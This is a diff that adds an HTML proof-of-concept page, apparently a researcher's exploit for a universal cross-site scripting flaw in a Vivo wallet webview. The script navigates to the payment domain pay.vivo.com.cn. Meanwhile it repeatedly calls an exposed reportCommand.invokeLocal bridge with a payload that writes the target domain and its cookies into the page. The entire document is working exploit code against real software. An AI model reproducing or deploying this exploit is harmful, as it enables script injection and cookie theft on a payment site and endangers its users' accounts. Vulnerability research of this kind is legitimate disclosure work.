@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Vivo Wallet UXSS - reportCommand Alert</title></head>
+<body>
+<pre>UXSS via reportCommand.invokeLocal - alert test</pre>
+<script>
+(function() {
+    var TARGET = "https://pay.vivo.com.cn/";
+    var TARGET_KEYWORD = "vivo";
+    var NAV_DELAY_MS = 200;
+
+    var payload = "document.write('UXSS:'+document.domain+' cookie='+document.cookie);//";
+
+    function inject() {
+        try {
+            var data = JSON.stringify({
+                webErrorCatch: payload
+            });
+            window.reportCommand.invokeLocal("xyzNotExist", data);
+        } catch(e) {}
+    }
+
+    for (var i = 0; i < 3000; i++) {
+        setTimeout(inject, NAV_DELAY_MS + i * 2);
+    }
+    for (var j = 0; j < 500; j++) {
+        setTimeout(inject, 500 + j);
+        setTimeout(inject, 1000 + j * 2);
+    }
+
+    setTimeout(function() {
+        location.href = TARGET;
+    }, NAV_DELAY_MS);
+})();
+</script>
+</body>
+</html>
